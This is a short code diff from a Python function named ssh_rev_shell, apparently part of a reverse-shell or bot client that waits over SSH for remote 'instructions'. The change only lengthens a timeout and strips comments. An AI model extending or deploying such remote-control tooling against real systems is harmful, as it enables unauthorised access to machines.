@@ -107,9 +107,9 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
             ssh_session.send(bot_user.encode())
 
             # Start the timeout thread
-            timeout = False  # Reset the timeout flag
-            timeout_thread = threading.Thread(target=max_timeout, args=(5,))
-            timeout_thread.daemon = True  # Ensure the thread exits with the program
+            timeout = False
+            timeout_thread = threading.Thread(target=max_timeout, args=(20,))
+            timeout_thread.daemon = True
             timeout_thread.start()
 
             print("[!] Listening for instructions ...")
